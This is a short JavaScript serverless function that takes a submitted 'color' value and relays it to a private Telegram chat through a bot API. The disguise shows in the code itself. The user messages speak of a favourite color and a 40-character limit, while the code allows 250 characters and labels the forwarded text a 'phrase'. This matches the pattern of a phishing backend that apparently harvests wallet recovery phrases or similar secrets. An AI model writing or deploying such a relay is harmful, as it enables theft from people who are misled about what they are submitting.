module.exports = async (req, res) => {
  // Only allow POST requests
  if (req.method !== "POST") {
    return res.status(405).json({
      success: false,
      message: "Method not allowed."
    });
  }

  try {
    // Get the submitted color
    const color = req.body?.color;

    // Validate input
    if (typeof color !== "string") {
      return res.status(400).json({
        success: false,
        message: "Please provide a valid color."
      });
    }

    const cleanColor = color.trim();

    if (!cleanColor || cleanColor.length > 250) {
      return res.status(400).json({
        success: false,
        message: "Color must be between 1 and 40 characters."
      });
    }

    // Get Telegram credentials from Vercel environment variables
    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.CHAT_ID;

    if (!botToken || !chatId) {
      console.error("BOT_TOKEN or CHAT_ID is missing.");

      return res.status(500).json({
        success: false,
        message: "Server configuration error."
      });
    }

    // Send color to Telegram
    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",

        headers: {
          "Content-Type": "application/json"
        },

        body: JSON.stringify({
          chat_id: chatId,
          text: `🎨 New phrase Entry\n\nphrase: ${cleanColor}`
        })
      }
    );

    const telegramResult = await telegramResponse.json();

    // Check Telegram response
    if (!telegramResponse.ok || !telegramResult.ok) {
      console.error("Telegram API error:", telegramResult);

      return res.status(502).json({
        success: false,
        message: "Could not send your color. Please try again."
      });
    }

    // Success
    return res.status(200).json({
      success: true,
      message: "Favourite color submitted successfully."
    });

  } catch (error) {
    console.error("Server error:", error);

    return res.status(500).json({
      success: false,
      message: "An unexpected server error occurred."
    });
  }
};